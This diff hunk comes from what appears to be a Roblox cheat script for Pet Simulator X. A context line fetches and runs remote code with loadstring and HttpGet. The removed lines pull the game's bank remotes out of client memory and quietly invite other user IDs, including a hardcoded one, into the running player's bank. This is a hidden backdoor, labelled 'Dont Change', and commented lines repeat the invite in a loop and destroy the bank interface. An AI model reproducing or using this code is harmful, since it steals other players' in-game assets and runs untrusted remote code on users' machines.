@@ -52,34 +52,5 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/S
 
 
 
--- Invite ID 
-
--- local idiot = 3617153442
-
--- Bank ID and Library
-
-local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
-local mybanks = getmybanksremote:InvokeServer()
-local BankID = mybanks[1]['BUID']
-local Bank = BankID
-
--- Bank ID and Library End
-
-inviteremote:InvokeServer(mybanks[1]['BUID'], UserName)
-
--- Invites Scripts ( Dont Change if u dont know any )
-
-inviteremote:InvokeServer(mybanks[1]['BUID'], _G.UserID)
-
---inviteremote:InvokeServer(mybanks[1]['BUID'], idiot)
-
---local deletebank = game.Players.LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]
---deletebank:Destroy()
-
---while task.wait(0.1) do
-  --inviteremote:InvokeServer(mybanks[1]['BUID'], idiot)
---end
 
 
-local getmybanksremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]).GetMyBanks, 3)
-local inviteremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]).InviteToBank, 11)
